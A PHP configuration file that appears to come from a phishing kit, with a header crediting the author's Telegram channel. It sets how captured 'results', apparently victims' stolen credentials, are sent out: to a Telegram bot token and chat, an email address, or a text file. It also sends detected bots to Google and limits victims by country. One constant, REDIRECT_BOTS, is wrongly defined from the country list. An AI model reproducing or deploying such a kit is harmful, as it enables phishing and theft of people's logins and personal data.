<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/

    $conf_redirect_bots       = 'https://www.google.com/';

    // Get results via telegram
    $conf_via_telegram        = 1;
    $conf_token               = "1111111111111:BjHkL-TkX0L95HJNNAAFNqzd54k1MOpUSg";
    $conf_chat_id             = "-8989989889";

    // Get results via email. Active it replacing 0 by 1.
    $conf_via_email           = 0;
    $conf_email               = "myemail@domain.com";

    // Get results via txt file. Active it replacing 0 by 1.
    $conf_via_txt             = 0;
    $conf_txtfilename         = "myResultsFile99";

    // Ex : ['ES','FR','DE']
    $conf_allowed_countries   = [];

    /////////////////////////////////////////////////

    define("VIA_TELEGRAM", $conf_via_telegram);
    define("TOKEN", $conf_token);
    define("CHAT_ID", $conf_chat_id);
    define("VIA_EMAIL", $conf_via_email);
    define("EMAIL", $conf_email);
    define("VIA_TXT", $conf_via_txt);
    define("TXT_FILENAME", $conf_txtfilename);
    define("ALLOWED_COUNTRIES", $conf_allowed_countries);
    define("REDIRECT_BOTS", $conf_allowed_countries);

?>